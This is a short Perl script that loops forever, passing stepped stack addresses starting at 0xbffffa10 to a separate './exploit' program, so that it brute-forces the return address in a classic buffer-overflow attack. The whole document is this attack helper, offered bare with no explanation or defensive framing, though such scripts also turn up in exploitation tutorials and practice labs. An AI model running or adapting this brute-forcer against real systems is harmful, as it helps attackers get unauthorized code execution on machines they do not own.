#!/usr/bin/perl

$cnt = 0xbffffa10;

while (1) {
   $hex = sprintf ("0x%x", $cnt);
   $res = system ("./exploit $hex");
   printf "$hex : $res\n";
   $cnt += 4;
}

